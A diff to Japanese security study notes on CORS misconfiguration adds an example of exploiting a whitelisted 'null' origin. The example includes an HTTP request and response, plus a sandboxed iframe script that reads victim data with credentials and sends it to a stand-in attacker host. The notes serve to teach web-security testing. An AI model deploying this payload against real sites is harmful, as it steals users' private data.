@@ -80,8 +80,33 @@ Access-Control-Allow-Origin: https://innocent-website.com
 	- サウンドボックス化されたクロスオリジンリクエスト
 
 - ローカル開発をサポートするためにnullオリジンをホワイトリストに登録する場合がある。
-	- ローカル環境のが合い`file://home/kali/.../index.html`となるので、CORSが存在しない。その場合に`null`を使用する。(オリジンは、「プロトコル＋ドメイン＋ポート」の組み合わせで決まるしきべ )
-
+	- ローカル環境のが合い`file://home/kali/.../index.html`となるので、CORSが存在しない。その場合に`null`を使用する。(オリジンは、「プロトコル＋ドメイン＋ポート」の組み合わせで決まる識別子である。)
+	↓リクエスト
+	```
+	GET /sensitive-victim-data
+	Host: vulnerable-website.com
+	Origin: null
+	```
+	↓レスポンス
+	```
+	HTTP/1.1 200 OK
+	Access-Control-Allow-Origin: null
+	Access-Control-Allow-Credentials: true
+	```
+	- 上記の様にnullが許可されていた場合クロスオリジンリクエストを生成することができる。
+	```html
+	<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+	var req = new XMLHttpRequest();
+	req.onload = reqListener;
+	req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+	req.withCredentials = true;
+	req.send();
+	
+	function reqListener() {
+	location='malicious-website.com/log?key='+this.responseText;
+	};
+	</script>"></iframe>
+	```
 ---
 ## 攻撃の説明
 ### 基本的なオリジンリフレクションによるCORSの脆弱性
